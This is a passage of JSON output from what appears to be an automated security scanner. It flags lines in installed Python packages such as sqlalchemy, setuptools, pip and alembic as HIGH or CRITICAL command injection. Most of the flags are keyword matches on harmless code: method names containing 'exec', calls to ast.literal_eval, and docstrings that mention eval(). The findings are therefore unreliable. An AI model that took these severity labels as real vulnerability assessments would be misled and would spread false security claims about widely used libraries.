            "file": "test_env/lib/python3.12/site-packages/sqlalchemy/dialects/postgresql/psycopg2.py",
            "line": 573,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "def post_exec(self):",
            "context": "class PGExecutionContext_psycopg2(_PGExecutionContext_common_psycopg):\n    _psycopg2_fetched_rows = None\n\n    def post_exec(self):\n        self._log_notices(self.cursor)\n\n    def _log_notices(self, cursor):",
            "cvss_score": 7.5
          },
          {
            "file": "test_env/lib/python3.12/site-packages/sqlalchemy/dialects/postgresql/pg8000.py",
            "line": 330,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "def pre_exec(self):",
            "context": "        ident = \"c_%s_%s\" % (hex(id(self))[2:], hex(_server_side_id())[2:])\n        return ServerSideCursor(self._dbapi_connection.cursor(), ident)\n\n    def pre_exec(self):\n        if not self.compiled:\n            return\n",
            "cvss_score": 7.5
          },
          {
            "file": "test_env/lib/python3.12/site-packages/sqlalchemy/dialects/oracle/cx_oracle.py",
            "line": 946,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "def pre_exec(self):",
            "context": "        else:\n            return None\n\n    def pre_exec(self):\n        super().pre_exec()\n        if not getattr(self.compiled, \"_oracle_cx_sql_compiler\", False):\n            return",
            "cvss_score": 7.5
          },
          {
            "file": "test_env/lib/python3.12/site-packages/sqlalchemy/dialects/oracle/cx_oracle.py",
            "line": 947,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "super().pre_exec()",
            "context": "            return None\n\n    def pre_exec(self):\n        super().pre_exec()\n        if not getattr(self.compiled, \"_oracle_cx_sql_compiler\", False):\n            return\n",
            "cvss_score": 7.5
          },
          {
            "file": "test_env/lib/python3.12/site-packages/sqlalchemy/dialects/oracle/cx_oracle.py",
            "line": 957,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "def post_exec(self):",
            "context": "\n        self._generate_cursor_outputtype_handler()\n\n    def post_exec(self):\n        if (\n            self.compiled\n            and is_sql_compiler(self.compiled)",
            "cvss_score": 7.5
          },
          {
            "file": "test_env/lib/python3.12/site-packages/sqlalchemy/dialects/oracle/base.py",
            "line": 1865,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "def pre_exec(self):",
            "context": "            type_,\n        )\n\n    def pre_exec(self):\n        if self.statement and \"_oracle_dblink\" in self.execution_options:\n            self.statement = self.statement.replace(\n                dictionary.DB_LINK_PLACEHOLDER,",
            "cvss_score": 7.5
          },
          {
            "file": "test_env/lib/python3.12/site-packages/sqlalchemy/dialects/mysql/mariadbconnector.py",
            "line": 82,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "def post_exec(self):",
            "context": "    def create_default_cursor(self):\n        return self._dbapi_connection.cursor(buffered=True)\n\n    def post_exec(self):\n        super().post_exec()\n\n        self._rowcount = self.cursor.rowcount",
            "cvss_score": 7.5
          },
          {
            "file": "test_env/lib/python3.12/site-packages/sqlalchemy/dialects/mysql/mariadbconnector.py",
            "line": 83,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "super().post_exec()",
            "context": "        return self._dbapi_connection.cursor(buffered=True)\n\n    def post_exec(self):\n        super().post_exec()\n\n        self._rowcount = self.cursor.rowcount\n",
            "cvss_score": 7.5
          },
          {
            "file": "test_env/lib/python3.12/site-packages/sqlalchemy/dialects/mysql/base.py",
            "line": 1238,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "def post_exec(self):",
            "context": "\n\nclass MySQLExecutionContext(default.DefaultExecutionContext):\n    def post_exec(self):\n        if (\n            self.isdelete\n            and cast(SQLCompiler, self.compiled).effective_returning",
            "cvss_score": 7.5
          },
          {
            "file": "test_env/lib/python3.12/site-packages/packaging/licenses/__init__.py",
            "line": 100,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "invalid = eval(python_expression, globals(), locals())",
            "context": "\n    python_expression = \" \".join(python_tokens)\n    try:\n        invalid = eval(python_expression, globals(), locals())\n    except Exception:\n        invalid = True\n",
            "cvss_score": 7.5
          },
          {
            "file": "test_env/lib/python3.12/site-packages/greenlet/tests/test_version.py",
            "line": 38,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "with os.popen(invoke_setup) as f:",
            "context": "\n\n        invoke_setup = \"%s %s --version\" % (sys.executable, setup_py)\n        with os.popen(invoke_setup) as f:\n            sversion = f.read().strip()\n\n        self.assertEqual(sversion, greenlet.__version__)",
            "cvss_score": 7.5
          },
          {
            "file": "test_env/lib/python3.12/site-packages/setuptools/tests/namespaces.py",
            "line": 34,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "assert ast.literal_eval(args)  # ensure it is valid Python",
            "context": "        raise ValueError(f\"Cannot recognise {impl=} when creating namespaces\")\n\n    args = json.dumps(setup_args, indent=4)\n    assert ast.literal_eval(args)  # ensure it is valid Python\n\n    script = textwrap.dedent(\n        \"\"\"\\",
            "cvss_score": 7.5
          },
          {
            "file": "test_env/lib/python3.12/site-packages/setuptools/tests/test_editable_install.py",
            "line": 449,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "exec(finder, loc, loc)",
            "context": "\n    def install_finder(self, finder):\n        loc = {}\n        exec(finder, loc, loc)\n        loc[\"install\"]()\n\n    def test_packages(self, tmp_path):",
            "cvss_score": 7.5
          },
          {
            "file": "test_env/lib/python3.12/site-packages/setuptools/tests/test_egg_info.py",
            "line": 277,
            "severity": "CRITICAL",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "install_cmd_kwargs = ast.literal_eval(val)",
            "context": "                name_kwargs = test_params.pop(0).split('\\n')\n                if len(name_kwargs) > 1:\n                    val = name_kwargs[1].strip()\n                    install_cmd_kwargs = ast.literal_eval(val)\n                else:\n                    install_cmd_kwargs = {}\n                name = name_kwargs[0].strip()",
            "cvss_score": 9.8
          },
          {
            "file": "test_env/lib/python3.12/site-packages/setuptools/_distutils/core.py",
            "line": 228,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "'script_name' is a file that will be read and run with 'exec()';",
            "context": "    keyword args from 'script' to 'setup()', or the contents of the\n    config files or command-line.\n\n    'script_name' is a file that will be read and run with 'exec()';\n    'sys.argv[0]' will be replaced with 'script' for the duration of the\n    call.  'script_args' is a list of strings; if supplied,\n    'sys.argv[1:]' will be replaced by 'script_args' for the duration of",
            "cvss_score": 7.5
          },
          {
            "file": "test_env/lib/python3.12/site-packages/setuptools/_distutils/core.py",
            "line": 268,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "exec(code, g)",
            "context": "            # tokenize.open supports automatic encoding detection\n            with tokenize.open(script_name) as f:\n                code = f.read().replace(r'\\r\\n', r'\\n')\n                exec(code, g)\n        finally:\n            sys.argv = save_argv\n            _setup_stop_after = None",
            "cvss_score": 7.5
          },
          {
            "file": "test_env/lib/python3.12/site-packages/setuptools/config/expand.py",
            "line": 72,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "ast.literal_eval(value)",
            "context": "        \"\"\"Attempt to load an attribute \"statically\", via :func:`ast.literal_eval`.\"\"\"\n        try:\n            return next(\n                ast.literal_eval(value)\n                for target, value in self._find_assignments()\n                if isinstance(target, ast.Name) and target.id == attr\n            )",
            "cvss_score": 7.5
          },
          {
            "file": "test_env/lib/python3.12/site-packages/setuptools/_vendor/typing_extensions.py",
            "line": 1215,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "(unless you are familiar with how eval() and exec() work).  The",
            "context": "        present.\n\n        BEWARE -- the behavior of globalns and localns is counterintuitive\n        (unless you are familiar with how eval() and exec() work).  The\n        search order is locals first, then globals.\n\n        - If no dict arguments are passed, an attempt is made to use the",
            "cvss_score": 7.5
          },
          {
            "file": "test_env/lib/python3.12/site-packages/setuptools/_vendor/typing_extensions.py",
            "line": 1215,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "(unless you are familiar with how eval() and exec() work).  The",
            "context": "        present.\n\n        BEWARE -- the behavior of globalns and localns is counterintuitive\n        (unless you are familiar with how eval() and exec() work).  The\n        search order is locals first, then globals.\n\n        - If no dict arguments are passed, an attempt is made to use the",
            "cvss_score": 7.5
          },
          {
            "file": "test_env/lib/python3.12/site-packages/setuptools/tests/config/test_pyprojecttoml.py",
            "line": 98,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "\"__main__.py\": \"def exec(): print('hello')\",",
            "context": "            \"__init__.py\": \"\",\n            \"mod.py\": \"class CustomSdist: pass\",\n            \"__version__.py\": \"VERSION = (3, 10)\",\n            \"__main__.py\": \"def exec(): print('hello')\",\n        },\n    }\n",
            "cvss_score": 7.5
          },
          {
            "file": "test_env/lib/python3.12/site-packages/setuptools/_distutils/command/bdist_rpm.py",
            "line": 357,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "out = os.popen(q_cmd)",
            "context": "        non_src_rpm = \"%{arch}/\" + nvr_string + \".%{arch}.rpm\"\n        q_cmd = rf\"rpm -q --qf '{src_rpm} {non_src_rpm}\\n' --specfile '{spec_path}'\"\n\n        out = os.popen(q_cmd)\n        try:\n            binary_rpms = []\n            source_rpm = None",
            "cvss_score": 7.5
          },
          {
            "file": "test_env/lib/python3.12/site-packages/setuptools/_distutils/compilers/C/base.py",
            "line": 1120,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "if lib_type not in eval(expected):",
            "context": "    ):\n        assert output_dir is not None\n        expected = '\"static\", \"shared\", \"dylib\", \"xcode_stub\"'\n        if lib_type not in eval(expected):\n            raise ValueError(f\"'lib_type' must be {expected}\")\n        fmt = getattr(self, lib_type + \"_lib_format\")\n        ext = getattr(self, lib_type + \"_lib_extension\")",
            "cvss_score": 7.5
          },
          {
            "file": "test_env/lib/python3.12/site-packages/setuptools/_vendor/more_itertools/recipes.py",
            "line": 992,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "def polynomial_eval(coefficients, x):",
            "context": "        yield n\n\n\ndef polynomial_eval(coefficients, x):\n    \"\"\"Evaluate a polynomial at a specific value.\n\n    Example: evaluating x^3 - 4 * x^2 - 17 * x + 60 at x = 2.5:",
            "cvss_score": 7.5
          },
          {
            "file": "test_env/lib/python3.12/site-packages/setuptools/_vendor/more_itertools/recipes.py",
            "line": 999,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": ">>> polynomial_eval(coefficients, x)",
            "context": "\n    >>> coefficients = [1, -4, -17, 60]\n    >>> x = 2.5\n    >>> polynomial_eval(coefficients, x)\n    8.125\n    \"\"\"\n    n = len(coefficients)",
            "cvss_score": 7.5
          },
          {
            "file": "test_env/lib/python3.12/site-packages/setuptools/_vendor/packaging/_parser.py",
            "line": 332,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "value = ast.literal_eval(python_str)",
            "context": "\n\ndef process_python_str(python_str: str) -> Value:\n    value = ast.literal_eval(python_str)\n    return Value(str(value))\n\n",
            "cvss_score": 7.5
          },
          {
            "file": "test_env/lib/python3.12/site-packages/setuptools/_vendor/wheel/vendored/packaging/_parser.py",
            "line": 334,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "value = ast.literal_eval(python_str)",
            "context": "\n\ndef process_python_str(python_str: str) -> Value:\n    value = ast.literal_eval(python_str)\n    return Value(str(value))\n\n",
            "cvss_score": 7.5
          },
          {
            "file": "test_env/lib/python3.12/site-packages/setuptools/_vendor/jaraco/functools/__init__.py",
            "line": 522,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "return eval(use)",
            "context": "                return func(*args, **kwargs)\n            except exceptions:\n                try:\n                    return eval(use)\n                except TypeError:\n                    return replace\n",
            "cvss_score": 7.5
          },
          {
            "file": "test_env/lib/python3.12/site-packages/setuptools/_vendor/packaging/licenses/__init__.py",
            "line": 100,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "invalid = eval(python_expression, globals(), locals())",
            "context": "\n    python_expression = \" \".join(python_tokens)\n    try:\n        invalid = eval(python_expression, globals(), locals())\n    except Exception:\n        invalid = True\n",
            "cvss_score": 7.5
          },
          {
            "file": "test_env/lib/python3.12/site-packages/pip/_vendor/six.py",
            "line": 735,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "exec(\"\"\"exec _code_ in _globs_, _locs_\"\"\")",
            "context": "            del frame\n        elif _locs_ is None:\n            _locs_ = _globs_\n        exec(\"\"\"exec _code_ in _globs_, _locs_\"\"\")\n\n    exec_(\"\"\"def reraise(tp, value, tb=None):\n    try:",
            "cvss_score": 7.5
          },
          {
            "file": "test_env/lib/python3.12/site-packages/pip/_vendor/typing_extensions.py",
            "line": 1251,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "(unless you are familiar with how eval() and exec() work).  The",
            "context": "        present.\n\n        BEWARE -- the behavior of globalns and localns is counterintuitive\n        (unless you are familiar with how eval() and exec() work).  The\n        search order is locals first, then globals.\n\n        - If no dict arguments are passed, an attempt is made to use the",
            "cvss_score": 7.5
          },
          {
            "file": "test_env/lib/python3.12/site-packages/pip/_vendor/typing_extensions.py",
            "line": 1251,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "(unless you are familiar with how eval() and exec() work).  The",
            "context": "        present.\n\n        BEWARE -- the behavior of globalns and localns is counterintuitive\n        (unless you are familiar with how eval() and exec() work).  The\n        search order is locals first, then globals.\n\n        - If no dict arguments are passed, an attempt is made to use the",
            "cvss_score": 7.5
          },
          {
            "file": "test_env/lib/python3.12/site-packages/pip/_internal/utils/setuptools_build.py",
            "line": 10,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "exec(compile('''",
            "context": "# Windows are correctly handled (it should be \"C:\\\\Users\" not \"C:\\Users\").\n_SETUPTOOLS_SHIM = textwrap.dedent(\n    \"\"\"\n    exec(compile('''\n    # This is <pip-setuptools-caller> -- a caller that pip uses to run setup.py\n    #\n    # - It imports setuptools before invoking setup.py, to enable projects that directly",
            "cvss_score": 7.5
          },
          {
            "file": "test_env/lib/python3.12/site-packages/pip/_internal/utils/setuptools_build.py",
            "line": 43,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "exec(compile(setup_py_code, filename, \"exec\"))",
            "context": "        filename = \"<auto-generated setuptools caller>\"\n        setup_py_code = \"from setuptools import setup; setup()\"\n\n    exec(compile(setup_py_code, filename, \"exec\"))\n    ''' % ({!r},), \"<pip-setuptools-caller>\", \"exec\"))\n    \"\"\"\n).rstrip()",
            "cvss_score": 7.5
          },
          {
            "file": "test_env/lib/python3.12/site-packages/pip/_internal/commands/configuration.py",
            "line": 239,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "subprocess.check_call(f'{editor} \"{fname}\"', shell=True)",
            "context": "            )\n\n        try:\n            subprocess.check_call(f'{editor} \"{fname}\"', shell=True)\n        except FileNotFoundError as e:\n            if not e.filename:\n                e.filename = editor",
            "cvss_score": 7.5
          },
          {
            "file": "test_env/lib/python3.12/site-packages/pip/_vendor/pyparsing/results.py",
            "line": 57,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "print(f\"{s} -> {fn(eval(s))}\")",
            "context": "        result = date_str.parse_string(\"1999/12/31\")\n\n        def test(s, fn=repr):\n            print(f\"{s} -> {fn(eval(s))}\")\n        test(\"list(result)\")\n        test(\"result[0]\")\n        test(\"result['month']\")",
            "cvss_score": 7.5
          },
          {
            "file": "test_env/lib/python3.12/site-packages/pip/_vendor/pkg_resources/__init__.py",
            "line": 1561,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "exec(code, namespace, namespace)",
            "context": "            with open(script_filename) as fid:\n                source = fid.read()\n            code = compile(source, script_filename, 'exec')\n            exec(code, namespace, namespace)\n        else:\n            from linecache import cache\n",
            "cvss_score": 7.5
          },
          {
            "file": "test_env/lib/python3.12/site-packages/pip/_vendor/pkg_resources/__init__.py",
            "line": 1572,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "exec(script_code, namespace, namespace)",
            "context": "                script_filename,\n            )\n            script_code = compile(script_text, script_filename, 'exec')\n            exec(script_code, namespace, namespace)\n\n    def _has(self, path):\n        raise NotImplementedError(",
            "cvss_score": 7.5
          },
          {
            "file": "test_env/lib/python3.12/site-packages/pip/_vendor/rich/markup.py",
            "line": 184,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "meta_params = literal_eval(parameters)",
            "context": "                            )\n\n                        try:\n                            meta_params = literal_eval(parameters)\n                        except SyntaxError as error:\n                            raise MarkupError(\n                                f\"error parsing {parameters!r} in {open_tag.parameters!r}; {error.msg}\"",
            "cvss_score": 7.5
          },
          {
            "file": "test_env/lib/python3.12/site-packages/pip/_vendor/urllib3/packages/six.py",
            "line": 787,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "exec (\"\"\"exec _code_ in _globs_, _locs_\"\"\")",
            "context": "            del frame\n        elif _locs_ is None:\n            _locs_ = _globs_\n        exec (\"\"\"exec _code_ in _globs_, _locs_\"\"\")\n\n    exec_(\n        \"\"\"def reraise(tp, value, tb=None):",
            "cvss_score": 7.5
          },
          {
            "file": "test_env/lib/python3.12/site-packages/pip/_vendor/pygments/formatters/__init__.py",
            "line": 91,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "this method is equivalent to running ``eval()`` on the input file. The formatter is",
            "context": "\n    The file is expected to contain a Formatter class named ``formattername``\n    (by default, CustomFormatter). Users should be very careful with the input, because\n    this method is equivalent to running ``eval()`` on the input file. The formatter is\n    given the `options` at its instantiation.\n\n    :exc:`pygments.util.ClassNotFound` is raised if there are any errors loading",
            "cvss_score": 7.5
          },
          {
            "file": "test_env/lib/python3.12/site-packages/pip/_vendor/pygments/formatters/__init__.py",
            "line": 103,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "exec(f.read(), custom_namespace)",
            "context": "        # This empty dict will contain the namespace for the exec'd file\n        custom_namespace = {}\n        with open(filename, 'rb') as f:\n            exec(f.read(), custom_namespace)\n        # Retrieve the class `formattername` from that namespace\n        if formattername not in custom_namespace:\n            raise ClassNotFound('no valid %s class found in %s' %",
            "cvss_score": 7.5
          },
          {
            "file": "test_env/lib/python3.12/site-packages/pip/_vendor/pygments/lexers/__init__.py",
            "line": 153,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "exec(f.read(), custom_namespace)",
            "context": "        # This empty dict will contain the namespace for the exec'd file\n        custom_namespace = {}\n        with open(filename, 'rb') as f:\n            exec(f.read(), custom_namespace)\n        # Retrieve the class `lexername` from that namespace\n        if lexername not in custom_namespace:\n            raise ClassNotFound('no valid %s class found in %s' %",
            "cvss_score": 7.5
          },
          {
            "file": "test_env/lib/python3.12/site-packages/alembic/util/langhelpers.py",
            "line": 220,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "exec(func_text, cast(\"Dict[str, Any]\", globals_), lcl)",
            "context": "        )\n        lcl: MutableMapping[str, Any] = {}\n\n        exec(func_text, cast(\"Dict[str, Any]\", globals_), lcl)\n        return cast(\"Callable[..., Any]\", lcl[name])\n\n",
            "cvss_score": 7.5
          },
          {
            "file": "test_env/lib/python3.12/site-packages/alembic/operations/base.py",
            "line": 191,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "exec(func_text, globals_, lcl)",
            "context": "            globals_.update({\"op_cls\": op_cls})\n            lcl: Dict[str, Any] = {}\n\n            exec(func_text, globals_, lcl)\n            setattr(cls, name, lcl[name])\n            fn.__func__.__doc__ = (\n                \"This method is proxied on \"",
            "cvss_score": 7.5
          },
          {
            "file": "test_env/lib/python3.12/site-packages/alembic/operations/batch.py",
            "line": 450,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "op_impl._exec(",
            "context": "        op_impl.create_table(self.new_table)\n\n        try:\n            op_impl._exec(\n                self.new_table.insert()\n                .inline()\n                .from_select(",
            "cvss_score": 7.5
          },
          {
            "file": "test_env/lib/python3.12/site-packages/alembic/runtime/migration.py",
            "line": 664,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "self.impl._exec(sql, execution_options)",
            "context": "        the current SQLAlchemy connection.\n\n        \"\"\"\n        self.impl._exec(sql, execution_options)\n\n    def _stdout_connection(\n        self, connection: Optional[Connection]",
            "cvss_score": 7.5
          },
          {
            "file": "test_env/lib/python3.12/site-packages/alembic/runtime/migration.py",
            "line": 670,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "self.impl._exec(construct)",
            "context": "        self, connection: Optional[Connection]\n    ) -> MockConnection:\n        def dump(construct, *multiparams, **params):\n            self.impl._exec(construct)\n\n        return MockEngineStrategy.MockConnection(self.dialect, dump)\n",
            "cvss_score": 7.5
          },
          {
            "file": "test_env/lib/python3.12/site-packages/alembic/runtime/migration.py",
            "line": 763,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "self.context.impl._exec(",
            "context": "        assert version not in self.heads\n        self.heads.add(version)\n\n        self.context.impl._exec(\n            self.context._version.insert().values(\n                version_num=literal_column(\"'%s'\" % version)\n            )",
            "cvss_score": 7.5
          },
          {
            "file": "test_env/lib/python3.12/site-packages/alembic/runtime/migration.py",
            "line": 772,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "ret = self.context.impl._exec(",
            "context": "    def _delete_version(self, version: str) -> None:\n        self.heads.remove(version)\n\n        ret = self.context.impl._exec(\n            self.context._version.delete().where(\n                self.context._version.c.version_num\n                == literal_column(\"'%s'\" % version)",
            "cvss_score": 7.5
          },
          {
            "file": "test_env/lib/python3.12/site-packages/alembic/runtime/migration.py",
            "line": 797,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "ret = self.context.impl._exec(",
            "context": "        self.heads.remove(from_)\n        self.heads.add(to_)\n\n        ret = self.context.impl._exec(\n            self.context._version.update()\n            .values(version_num=literal_column(\"'%s'\" % to_))\n            .where(",
            "cvss_score": 7.5
          },
          {
            "file": "test_env/lib/python3.12/site-packages/alembic/ddl/oracle.py",
            "line": 53,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "def _exec(self, construct: Any, *args, **kw) -> Optional[CursorResult]:",
            "context": "            \"oracle_batch_separator\", self.batch_separator\n        )\n\n    def _exec(self, construct: Any, *args, **kw) -> Optional[CursorResult]:\n        result = super()._exec(construct, *args, **kw)\n        if self.as_sql and self.batch_separator:\n            self.static_output(self.batch_separator)",
            "cvss_score": 7.5
          },
          {
            "file": "test_env/lib/python3.12/site-packages/alembic/ddl/oracle.py",
            "line": 54,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "result = super()._exec(construct, *args, **kw)",
            "context": "        )\n\n    def _exec(self, construct: Any, *args, **kw) -> Optional[CursorResult]:\n        result = super()._exec(construct, *args, **kw)\n        if self.as_sql and self.batch_separator:\n            self.static_output(self.batch_separator)\n        return result",
            "cvss_score": 7.5
          },
          {
            "file": "test_env/lib/python3.12/site-packages/alembic/ddl/oracle.py",
            "line": 88,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "self._exec(\"SET TRANSACTION READ WRITE\")",
            "context": "        return rendered_inspector_default != rendered_metadata_default\n\n    def emit_begin(self) -> None:\n        self._exec(\"SET TRANSACTION READ WRITE\")\n\n    def emit_commit(self) -> None:\n        self._exec(\"COMMIT\")",
            "cvss_score": 7.5
          },
          {
            "file": "test_env/lib/python3.12/site-packages/alembic/ddl/oracle.py",
            "line": 91,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "self._exec(\"COMMIT\")",
            "context": "        self._exec(\"SET TRANSACTION READ WRITE\")\n\n    def emit_commit(self) -> None:\n        self._exec(\"COMMIT\")\n\n\n@compiles(AddColumn, \"oracle\")",
            "cvss_score": 7.5
          },
          {
            "file": "test_env/lib/python3.12/site-packages/alembic/ddl/postgresql.py",
            "line": 99,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "self._exec(CreateIndex(index, **kw))",
            "context": "                index.table.append_column(  # type: ignore[union-attr]\n                    Column(col, sqltypes.NullType)\n                )\n        self._exec(CreateIndex(index, **kw))\n\n    def prep_table_for_batch(self, batch_impl, table):\n        for constraint in table.constraints:",
            "cvss_score": 7.5
          },
          {
            "file": "test_env/lib/python3.12/site-packages/alembic/ddl/postgresql.py",
            "line": 179,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "self._exec(",
            "context": "            )\n\n        if type_ is not None:\n            self._exec(\n                PostgresqlColumnType(\n                    table_name,\n                    column_name,",
            "cvss_score": 7.5
          },
          {
            "file": "test_env/lib/python3.12/site-packages/alembic/ddl/impl.py",
            "line": 203,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "def _exec(",
            "context": "    def bind(self) -> Optional[Connection]:\n        return self.connection\n\n    def _exec(\n        self,\n        construct: Union[Executable, str],\n        execution_options: Optional[Mapping[str, Any]] = None,",
            "cvss_score": 7.5
          },
          {
            "file": "test_env/lib/python3.12/site-packages/alembic/ddl/impl.py",
            "line": 253,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "self._exec(sql, execution_options)",
            "context": "        sql: Union[Executable, str],\n        execution_options: Optional[dict[str, Any]] = None,\n    ) -> None:\n        self._exec(sql, execution_options)\n\n    def alter_column(\n        self,",
            "cvss_score": 7.5
          },
          {
            "file": "test_env/lib/python3.12/site-packages/alembic/ddl/impl.py",
            "line": 283,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "self._exec(",
            "context": "                stacklevel=3,\n            )\n        if nullable is not None:\n            self._exec(\n                base.ColumnNullable(\n                    table_name,\n                    column_name,",
            "cvss_score": 7.5
          },
          {
            "file": "test_env/lib/python3.12/site-packages/alembic/ddl/impl.py",
            "line": 315,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "self._exec(",
            "context": "                kw[\"impl\"] = self\n            else:\n                cls_ = base.ColumnDefault\n            self._exec(\n                cls_(\n                    table_name,\n                    column_name,",
            "cvss_score": 7.5
          },
          {
            "file": "test_env/lib/python3.12/site-packages/alembic/ddl/impl.py",
            "line": 329,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "self._exec(",
            "context": "                )\n            )\n        if type_ is not None:\n            self._exec(\n                base.ColumnType(\n                    table_name,\n                    column_name,",
            "cvss_score": 7.5
          },
          {
            "file": "test_env/lib/python3.12/site-packages/alembic/ddl/impl.py",
            "line": 343,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "self._exec(",
            "context": "            )\n\n        if comment is not False:\n            self._exec(\n                base.ColumnComment(\n                    table_name,\n                    column_name,",
            "cvss_score": 7.5
          },
          {
            "file": "test_env/lib/python3.12/site-packages/alembic/ddl/impl.py",
            "line": 358,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "self._exec(",
            "context": "\n        # do the new name last ;)\n        if name is not None:\n            self._exec(\n                base.ColumnName(\n                    table_name,\n                    column_name,",
            "cvss_score": 7.5
          },
          {
            "file": "test_env/lib/python3.12/site-packages/alembic/ddl/impl.py",
            "line": 378,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "self._exec(",
            "context": "        schema: Optional[Union[str, quoted_name]] = None,\n        if_not_exists: Optional[bool] = None,\n    ) -> None:\n        self._exec(\n            base.AddColumn(\n                table_name,\n                column,",
            "cvss_score": 7.5
          },
          {
            "file": "test_env/lib/python3.12/site-packages/alembic/ddl/impl.py",
            "line": 396,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "self._exec(",
            "context": "        if_exists: Optional[bool] = None,\n        **kw,\n    ) -> None:\n        self._exec(\n            base.DropColumn(\n                table_name, column, schema=schema, if_exists=if_exists\n            )",
            "cvss_score": 7.5
          },
          {
            "file": "test_env/lib/python3.12/site-packages/alembic/ddl/impl.py",
            "line": 404,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "self._exec(schema.AddConstraint(const))",
            "context": "\n    def add_constraint(self, const: Any) -> None:\n        if const._create_rule is None or const._create_rule(self):\n            self._exec(schema.AddConstraint(const))\n\n    def drop_constraint(self, const: Constraint, **kw: Any) -> None:\n        self._exec(schema.DropConstraint(const, **kw))",
            "cvss_score": 7.5
          },
          {
            "file": "test_env/lib/python3.12/site-packages/alembic/ddl/impl.py",
            "line": 407,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "self._exec(schema.DropConstraint(const, **kw))",
            "context": "            self._exec(schema.AddConstraint(const))\n\n    def drop_constraint(self, const: Constraint, **kw: Any) -> None:\n        self._exec(schema.DropConstraint(const, **kw))\n\n    def rename_table(\n        self,",
            "cvss_score": 7.5
          },
          {
